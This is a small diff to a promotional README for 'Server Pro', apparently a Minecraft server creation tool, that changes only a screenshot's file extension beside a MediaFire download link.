@@ -7,6 +7,6 @@ Create **Minecraft servers** effortlessly with just a few clicks using this intu
 Get started with your Minecraft adventure today! [Download Server Pro](https://www.mediafire.com/file/kzzxehjitq0o8jn/Server_Pro.zip/file).
 
 ## Screenshots:<br>
-![Server_Pro_UI](images/img2.PNG)<br>
+![Server_Pro_UI](images/img2.png)<br>
 <br>
 **Author:** OrbitX.Space
